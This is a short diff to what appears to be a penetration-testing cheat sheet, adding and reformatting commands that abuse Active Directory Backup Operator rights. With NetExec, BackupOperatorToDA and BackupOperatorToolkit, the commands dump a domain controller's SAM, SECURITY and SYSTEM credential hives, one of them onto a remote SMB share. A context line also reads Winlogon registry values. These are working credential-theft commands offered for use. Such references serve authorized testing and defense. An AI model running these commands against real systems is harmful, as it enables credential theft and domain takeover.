@@ -151,8 +151,23 @@ $winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
 
 Retrieve `SAM`,`SECURITY` and `SYSTEM` hives
 
-* [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA): `.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\`
-* [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit): `.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK`
+* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
+
+    ```ps1
+    nxc smb 10.10.10.10 -u user -p password -M backup_operator
+    ```
+
+* [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)
+
+    ```ps1
+    .\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\
+    ```
+
+* [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit)
+
+    ```ps1
+    .\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK
+    ```
 
 ## References
 
